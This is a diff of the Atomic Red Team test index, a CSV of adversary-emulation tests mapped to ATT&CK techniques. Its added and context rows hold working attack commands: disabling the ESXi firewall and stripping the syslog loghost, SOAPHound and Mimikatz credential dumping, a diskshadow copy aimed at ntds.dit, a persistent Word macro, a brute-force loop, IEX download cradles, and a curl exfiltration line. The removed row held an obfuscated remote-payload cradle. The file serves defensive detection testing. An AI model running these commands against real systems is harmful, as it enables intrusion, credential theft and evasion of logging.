@@ -5820,6 +5820,41 @@ T1562.004,Impair Defenses: Disable or Modify System Firewall,Blackbit - Disable 
 ",windows,,,"netsh firewall set opmode mode=disable
 ",command_prompt,True,,"netsh firewall set opmode mode=enable >nul 2>&1
 ",,,
+T1562.004,Impair Defenses: Disable or Modify System Firewall,ESXi - Disable Firewall via Esxcli,bac8a340-be64-4491-a0cc-0985cb227f5a,"Adversaries may disable the ESXI firewall via ESXCLI
+",windows,,,"#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToAtomicsFolder\..\atomics\T1562.004\src\esxi_disable_firewall.txt
+",command_prompt,False,,"#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToAtomicsFolder\..\atomics\T1562.004\src\esxi_enable_firewall.txt
+",powershell,"dependencies.0.description: The plink executable must be found in the ExternalPayloads folder.
+
+dependencies.0.prereq_command: if (Test-Path ""#{plink_file}"") {exit 0} else {exit 1}
+
+dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
+Invoke-WebRequest ""https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"" -OutFile ""#{plink_file}""
+
+","input_arguments.vm_host.description: Specify the host name of the ESXi Server
+
+input_arguments.vm_host.type: string
+
+input_arguments.vm_host.default: atomic.local
+
+input_arguments.plink_file.description: Path to Putty
+
+input_arguments.plink_file.type: path
+
+input_arguments.plink_file.default: PathToAtomicsFolder\..\ExternalPayloads\plink.exe
+
+input_arguments.username.description: username used to log into ESXi
+
+input_arguments.username.type: string
+
+input_arguments.username.default: root
+
+input_arguments.password.description: password used to log into ESXI
+
+input_arguments.password.type: string
+
+input_arguments.password.default: n/a
+
+"
 T1137,Office Application Startup,Office Application Startup - Outlook as a C2,bfe6ac15-c50b-4c4f-a186-0fc6b8ba936c,"As outlined in MDSEC's Blog post https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/ 
 it is possible to use Outlook Macro as a way to achieve persistance and execute arbitrary commands. This transform Outlook into a C2.
 Too achieve this two things must happened on the syste
@@ -8122,6 +8157,69 @@ input_arguments.enc_pass.description: Password used to encrypt the data
 input_arguments.enc_pass.type: string
 
 input_arguments.enc_pass.default: atomic_enc_pass
+
+"
+T1560.001,Archive Collected Data: Archive via Utility,ESXi - Remove Syslog remote IP,36c62584-d360-41d6-886f-d194654be7c2,"An adversary may edit the syslog config to remove the loghost in order to prevent or redirect logs being received by SIEM.
+",windows,,,"# Extract line with IP address from the syslog configuration output
+#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToAtomicsFolder\..\atomics\T1560.001\src\esxi_get_loghost.txt | findstr /r ""[0-9]*\.[0-9]*\.[0-9]*\."" > c:\temp\loghost.txt
+
+# Replace the IP with ""0""
+#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToAtomicsFolder\..\atomics\T1560.001\src\esxi_remove_loghost.txt
+
+# Extract the IP from the line extracted from findstr
+$inputFilePath = ""c:\temp\loghost.txt""
+$outputFilePath = ""c:\temp\loghost_ip.txt""
+
+$fileContent = Get-Content -Path $inputFilePath -Raw
+
+if ([string]::IsNullOrWhiteSpace($fileContent)) {
+    Write-Host ""The content is $fileContent""
+    Write-Host ""The file is empty""
+} else {
+    # Use a regular expression to extract IP addresses
+    $ipAddresses = [regex]::Matches($fileContent, '(udp|tcp):\/\/[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.*').Value
+    
+    $output = ""esxcli system syslog config set --loghost="" + $ipAddresses
+
+    $output | Out-File -FilePath $outputFilePath -Encoding ascii
+    
+    Write-Host ""IP addresses extracted and saved to $outputFilePath""
+}
+",powershell,True,,"# Re-add the initially extracted IP
+#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m c:\temp\loghost_ip.txt
+
+rm c:\temp\loghost_ip.txt
+rm c:\temp\loghost.txt
+",powershell,"dependencies.0.description: The plink executable must be found in the ExternalPayloads folder.
+
+dependencies.0.prereq_command: if (Test-Path ""#{plink_file}"") {exit 0} else {exit 1}
+
+dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
+Invoke-WebRequest ""https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"" -OutFile ""#{plink_file}""
+
+","input_arguments.vm_host.description: Specify the host name of the ESXi Server
+
+input_arguments.vm_host.type: string
+
+input_arguments.vm_host.default: atomic.local
+
+input_arguments.plink_file.description: Path to Putty
+
+input_arguments.plink_file.type: path
+
+input_arguments.plink_file.default: PathToAtomicsFolder\..\ExternalPayloads\plink.exe
+
+input_arguments.username.description: Username used to log into ESXi
+
+input_arguments.username.type: string
+
+input_arguments.username.default: root
+
+input_arguments.password.description: password used to log into ESXI
+
+input_arguments.password.type: string
+
+input_arguments.password.default: n/a
 
 "
 T1036,Masquerading,System File Copied to Unusual Location,51005ac7-52e2-45e0-bdab-d17c6d4916cd,It may be suspicious seeing a file copy of an EXE in System32 or SysWOW64 to a non-system directory or executing from a non-system directory.,windows,,,"copy-item ""$env:windir\System32\cmd.exe"" -destination ""$env:allusersprofile\cmd.exe""
@@ -11280,11 +11378,6 @@ Invoke-BloodHound -OutputDirectory $env:Temp
 Start-Sleep 5
 ",powershell,,,"Remove-Item $env:Temp\*BloodHound.zip -Force
 ",,,
-T1059.001,Command and Scripting Interpreter: PowerShell,Obfuscation Tests,4297c41a-8168-4138-972d-01f3ee92c804,"Different obfuscated methods to test. Upon execution, reaches out to bit.ly/L3g1t and displays: ""SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION""
-",windows,,,"(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
-(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()
-Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))
-",powershell,,,,,,
 T1059.001,Command and Scripting Interpreter: PowerShell,Mimikatz - Cradlecraft PsSendKeys,af1800cf-9f9d-4fd1-a709-14b1e6de020d,"Run mimikatz via PsSendKeys. Upon execution, automated actions will take place to open file explorer, open notepad and input code, then mimikatz dump info will be displayed.
 ",windows,,,"$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr
 ",powershell,True,,,,,
@@ -11505,6 +11598,92 @@ T1059.001,Command and Scripting Interpreter: PowerShell,Abuse Nslookup with DNS 
 function nslookup  { &""$env:windir\system32\nslookup.exe"" @args | Out-Null; @("""",""whoami"")}
 powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]
 ",powershell,,,,,,
+T1059.001,Command and Scripting Interpreter: PowerShell,SOAPHound - Dump BloodHound Data,6a5b2a50-d037-4879-bf01-43d4d6cbf73f,"Dump BloodHound data using SOAPHound. Upon execution, BloodHound data will be dumped and stored in the specified output directory.
+src: https://github.com/FalconForceTeam/SOAPHound
+",windows,,,"#{soaphound_path} --user #{user} --password #{password} --domain #{domain} --dc #{dc} --bhdump --cachefilename #{cachefilename} --outputdirectory #{outputdirectory}
+",powershell,,,,,,"input_arguments.user.description: Username for authentication
+
+input_arguments.user.type: string
+
+input_arguments.user.default: $env:USERNAME
+
+input_arguments.password.description: Password for authentication
+
+input_arguments.password.type: string
+
+input_arguments.password.default: P@ssword1
+
+input_arguments.domain.description: Domain for authentication
+
+input_arguments.domain.type: string
+
+input_arguments.domain.default: $env:USERDOMAIN
+
+input_arguments.dc.description: Domain Controller IP
+
+input_arguments.dc.type: string
+
+input_arguments.dc.default: 10.0.1.14
+
+input_arguments.cachefilename.description: Cache filename
+
+input_arguments.cachefilename.type: string
+
+input_arguments.cachefilename.default: c:\temp\cache.txt
+
+input_arguments.outputdirectory.description: Output directory
+
+input_arguments.outputdirectory.type: string
+
+input_arguments.outputdirectory.default: c:\temp\test2
+
+input_arguments.soaphound_path.description: Path to SOAPHound binary
+
+input_arguments.soaphound_path.type: string
+
+input_arguments.soaphound_path.default: PathToAtomicsFolder\T1059.001\bin\SOAPHound.exe
+
+"
+T1059.001,Command and Scripting Interpreter: PowerShell,SOAPHound - Build Cache,4099086c-1470-4223-8085-8186e1ed5948,"Build cache using SOAPHound. Upon execution, a cache will be built and stored in the specified cache filename.
+src: https://github.com/FalconForceTeam/SOAPHound
+",windows,,,"#{soaphound_path} --user $(#{user})@$(#{domain}) --password #{password} --dc #{dc} --buildcache --cachefilename #{cachefilename}
+",powershell,,,,,,"input_arguments.user.description: Username for authentication
+
+input_arguments.user.type: string
+
+input_arguments.user.default: $env:USERNAME
+
+input_arguments.password.description: Password for authentication
+
+input_arguments.password.type: string
+
+input_arguments.password.default: P@ssword1
+
+input_arguments.domain.description: Domain for authentication
+
+input_arguments.domain.type: string
+
+input_arguments.domain.default: $env:USERDOMAIN
+
+input_arguments.dc.description: Domain Controller IP
+
+input_arguments.dc.type: string
+
+input_arguments.dc.default: 10.0.1.14
+
+input_arguments.cachefilename.description: Cache filename
+
+input_arguments.cachefilename.type: string
+
+input_arguments.cachefilename.default: c:\temp\cache.txt
+
+input_arguments.soaphound_path.description: Path to SOAPHound binary
+
+input_arguments.soaphound_path.type: string
+
+input_arguments.soaphound_path.default: PathToAtomicsFolder\T1059.001\bin\SOAPHound.exe
+
+"
 T1547.003,Time Providers,Create a new time provider,df1efab7-bc6d-4b88-8be9-91f55ae017aa,"Establishes persistence by creating a new time provider registry key under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProvider.
 The new time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt
 in C:\Users\Public\ as validation that the test is successful.
@@ -19162,6 +19341,17 @@ input_arguments.symlink_path.type: string
 input_arguments.symlink_path.default: C:\Temp\vssstore
 
 "
+T1003.003,OS Credential Dumping: NTDS,Create Volume Shadow Copy with diskshadow,b385996c-0e7d-4e27-95a4-aca046b119a7,"This test is intended to be run on a domain controller
+An alternative to using vssadmin to create a Volume Shadow Copy for extracting ntds.dit
+",windows,,,"mkdir c:\exfil
+diskshadow.exe /s #{filename}
+",command_prompt,True,,,,,"input_arguments.filename.description: Location of the script
+
+input_arguments.filename.type: Path
+
+input_arguments.filename.default: PathToAtomicsFolder\T1003.003\src\diskshadow.txt
+
+"
 T1547.001,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,Reg Key Run,e55be3fd-3521-4610-9d1a-e210e42dcf05,"Run Key Persistence
 
 Upon successful execution, cmd.exe will modify the registry by adding \""Atomic Red Team\"" to the Run key. Output will be via stdout. 
@@ -22234,6 +22424,139 @@ input_arguments.process_name.type: string
 input_arguments.process_name.default: spoolsv.exe
 
 "
+T1137.001,Office Application Startup: Office Template Macros.,Injecting a Macro into the Word Normal.dotm Template for Persistence via PowerShell,940db09e-80b6-4dd0-8d4d-7764f89b47a8,"Injects a Macro in the Word default template ""Normal.dotm"" and makes it execute each time that Word is opened. In this test, the Macro creates a sheduled task to open Calc.exe every evening.
+",windows,,,"# Registry setting to ""Trust access to the VBA project object model"" in Word
+$registryKey = ""HKCU:Software\Microsoft\Office\16.0\Word\Security""
+$registryValue = ""AccessVBOM""
+$registryData = ""1""
+# The path where a flag text file will be created if Registry setting did not already exist or if it was set to 0
+$flagPath1 = ""$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag1.txt""
+$flagPath2 = ""$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag2.txt""
+# Get the value of the Key/Value pair
+$value = (Get-ItemProperty -Path $registryKey -Name $registryValue -ErrorAction SilentlyContinue).$registryValue
+# Logical operation to: if the value of the key/value is 1, do nothing - 
+# if the value is 0, change it to 1 and create flag1 - 
+# if it doesn't exist, create the value and flag2
+if ($value -eq ""1"") 
+{
+  Write-Host ""The registry value '$registryValue' already exists with the required setting.""
+}   
+  elseif ($value -eq ""0"") 
+{
+  Write-Host ""The registry value was set to 0, temporarily changing to 1.""
+  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
+  echo ""flag1"" > $flagPath1
+} 
+  else 
+{
+  Write-Host ""The registry value '$registryValue' does not exist, temporarily creating it.""
+  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData -PropertyType DWORD -Force | Out-Null
+  echo ""flag2"" > $flagPath2
+}
+Add-Type -AssemblyName Microsoft.Office.Interop.Word
+# Define the path of copied normal template for restoral
+$copyPath = ""$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal1.dotm""
+# Define the path to the normal template
+$docPath = ""$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal.dotm""
+# Create copy of orginal template for restoral
+Copy-Item -Path $docPath -Destination $copyPath -Force
+# VBA code to be insterted as a Macro
+# Will create a scheduled task to open the Calculator at 8:04pm daily
+$vbaCode = @""
+  Sub AutoExec()
+  Dim applicationPath As String
+  Dim taskName As String
+  Dim runTime As String
+  Dim schTasksCmd As String
+  applicationPath = ""C:\Windows\System32\calc.exe""
+  taskName = ""OpenCalcTask""
+  runTime = ""20:04""
+  schTasksCmd = ""schtasks /create /tn """""" & taskName & """""" /tr """""" & applicationPath & """""" /sc daily /st "" & runTime & "" /f""
+  Shell ""cmd.exe /c "" & schTasksCmd, vbNormalFocus
+  End Sub
+""@
+# Create a new instance of Word.Application
+$word = New-Object -ComObject Word.Application
+# Keep the Word application hidden
+$word.Visible = $false
+# Open the document
+$document = $word.Documents.Open($docPath)
+# Access the VBA project of the document
+$vbaProject = $document.VBProject
+# Add a new module to the VBA project
+$newModule = $vbaProject.VBComponents.Add(1) # 1 = vbext_ct_StdModule
+# Add the VBA code to the new module
+$newModule.CodeModule.AddFromString($vbaCode)
+# Run the Macro
+$word.run(""AutoExec"")
+# Save and close the document
+$document.SaveAs($docPath)
+$document.Close()
+# Quit Word
+$word.Quit()
+# Release COM objects
+[System.Runtime.InteropServices.Marshal]::ReleaseComObject($document) | Out-Null
+[System.Runtime.InteropServices.Marshal]::ReleaseComObject($word) | Out-Null
+[System.Runtime.InteropServices.Marshal]::ReleaseComObject($vbaProject) | Out-Null
+[System.Runtime.InteropServices.Marshal]::ReleaseComObject($newModule) | Out-Null
+",powershell,True,,"# Registry setting to ""Trust access to the VBA project object model"" in Word
+$registryKey = ""HKCU:Software\Microsoft\Office\16.0\Word\Security""
+$registryValue = ""AccessVBOM""
+$registryData1 = ""1""
+$registryData0 = ""0""
+# Defines the path each flag file created depending on the original registry state
+$flagPath1 = ""$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag1.txt""
+$flagPath2 = ""$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\T1137-001_Flag2.txt""
+# Define the path of copied normal template for restoral
+$copyPath = ""$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal1.dotm""
+# Define the path to the normal template
+$docPath = ""$env:USERPROFILE\AppData\Roaming\Microsoft\Templates\Normal.dotm""
+# Delete the scheduled task created by the Macro
+schtasks /Delete /TN ""OpenCalcTask"" /F | Out-Null
+#Restore the orginal template if the backup copy exists
+if (Test-Path $copyPath)
+{
+  #Delete the injected template
+  Remove-Item -Force $docPath -ErrorAction SilentlyContinue
+  # Restore the original template
+  Rename-Item -Force -Path $copyPath -NewName $docPath -ErrorAction SilentlyContinue
+  Write-Host ""The original template has been restored""
+}
+  else
+{
+  Write-Host ""The original template is present""
+}
+#Restore the original state of the registry key
+if (Test-Path $flagPath1) 
+{
+  # The value was originally 0, set back to 0
+  New-ItemProperty -Path $registryKey -Name $registryValue -Value $registryData0 -PropertyType DWORD -Force | Out-Null
+  Remove-Item -Force $flagPath1 -ErrorAction SilentlyContinue
+  Write-Host ""The original registry state has been restored""
+} 
+  elseif (Test-Path $flagPath2)
+{
+  #The value did not previously exist, delete the value
+  Remove-ItemProperty -Path $registryKey -Name $registryValue | Out-Null
+  Remove-Item -Force $flagPath2 -ErrorAction SilentlyContinue | Out-Null
+  Write-Host ""The original registry state has been restored""
+}
+  else 
+{
+  # The value was already 1, do nothing
+  Write-Host ""The value $registryValue already existed in $registryKey.""
+}
+",,"dependencies.0.description: Microsoft Word must be installed
+
+dependencies.0.prereq_command: try {
+  New-Object -COMObject ""Word.Application"" | Out-Null
+  Stop-Process -Name ""winword""
+  exit 0
+} catch { exit 1 }
+
+dependencies.0.get_prereq_command: Write-Host ""You will need to install Microsoft Word manually to meet this requirement""
+
+",
 T1557.001,Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay,LLMNR Poisoning with Inveigh (PowerShell),deecd55f-afe0-4a62-9fba-4d1ba2deb321,Inveigh conducts spoofing attacks and hash/credential captures through both packet sniffing and protocol specific listeners/sockets. This Atomic will run continuously until you cancel it or it times out.,windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 IEX (iwr ""https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/82be2377ade47a4e325217b4144878a59595e750/Inveigh.ps1"" -UseBasicParsing)
 Invoke-Inveigh -ConsoleOutput Y -NBNS Y -MDNS Y -HTTPS Y -PROXY Y",powershell,True,,,,,
@@ -24206,6 +24529,38 @@ input_arguments.remote_url.type: url
 input_arguments.remote_url.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh
 
 "
+T1110.001,Brute Force: Password Guessing,ESXi - Brute Force Until Account Lockout,ed6c2c87-bba6-4a28-ac6e-c8af3d6c2ab5,"An adversary may attempt to brute force the password of privilleged account for privilege escalation.
+In the process, the TA may lock the account, which can be used for detection. [Reference](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/#:~:text=A%20ransomware%20group%20attacking%20large,internal%20systems%20after%20establishing%20a)
+",windows,,,"$lockout_threshold = [int]""#{lockout_threshold}""
+for ($var = 1; $var -le $lockout_threshold; $var++) {
+  #{plink_file} -ssh ""#{vm_host}"" -l root -pw f0b443ae-9565-11ee-b9d1-0242ac120002
+  }
+",powershell,False,,,powershell,"dependencies.0.description: The plink executable must be found in the ExternalPayloads folder.
+
+dependencies.0.prereq_command: if (Test-Path ""#{plink_file}"") {exit 0} else {exit 1}
+
+dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
+Invoke-WebRequest ""https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe"" -OutFile ""#{plink_file}""
+
+","input_arguments.vm_host.description: Specify the host name of the ESXi Server
+
+input_arguments.vm_host.type: string
+
+input_arguments.vm_host.default: atomic.local
+
+input_arguments.plink_file.description: Path to Putty
+
+input_arguments.plink_file.type: path
+
+input_arguments.plink_file.default: PathToAtomicsFolder\..\ExternalPayloads\plink.exe
+
+input_arguments.lockout_threshold.description: Specify the account lockout threshold configured on the ESXI management server
+
+input_arguments.lockout_threshold.type: string
+
+input_arguments.lockout_threshold.default: 5
+
+"
 T1132.001,Data Encoding: Standard Encoding,Base64 Encoded data.,1164f70f-9a88-4dff-b9ff-dc70e7bf0c25,"Utilizing a common technique for posting base64 encoded data.
 ",macos,linux,,"echo -n 111-11-1111 | base64
 curl -XPOST #{base64_data}.#{destination_url}
@@ -24477,6 +24832,27 @@ rundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr
 input_arguments.exe_to_launch.type: path
 
 input_arguments.exe_to_launch.default: %windir%\System32\calc.exe
+
+"
+T1218.011,Signed Binary Proxy Execution: Rundll32,Running DLL with .init extension and function,2d5029f0-ae20-446f-8811-e7511b58e8b6,"This test, based on common Gamarue tradecraft, consists of a DLL file with a .init extension being run by rundll32.exe. When this DLL file's 'krnl' function is called, it launches a Windows pop-up.
+DLL created with the AtomicTestHarnesses Portable Executable Builder script.
+",windows,,,"rundll32.exe #{dll_file},krnl
+",command_prompt,,,,powershell,"dependencies.0.description: The DLL file to be called must exist at the specified location (#{dll_file})
+dependencies.0.prereq_command: if (Test-Path ""#{dll_file}"") {exit 0} else {exit 1}
+dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{dll_file}"") -ErrorAction ignore | Out-Null
+Invoke-WebRequest ""#{dll_url}"" -OutFile ""#{dll_file}""
+
+","input_arguments.dll_file.description: The DLL file to be called
+
+input_arguments.dll_file.type: string
+
+input_arguments.dll_file.default: PathToAtomicsFolder\T1218.011\bin\_WT.init
+
+input_arguments.dll_url.description: The URL to the DLL file that must be downloaded
+
+input_arguments.dll_url.type: url
+
+input_arguments.dll_url.default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/bin/_WT.init
 
 "
 T1218.004,Signed Binary Proxy Execution: InstallUtil,CheckIfInstallable method call,ffd9c807-d402-47d2-879d-f915cf2a3a94,"Executes the CheckIfInstallable class constructor runner instead of executing InstallUtil. Upon execution, the InstallUtil test harness will be executed.
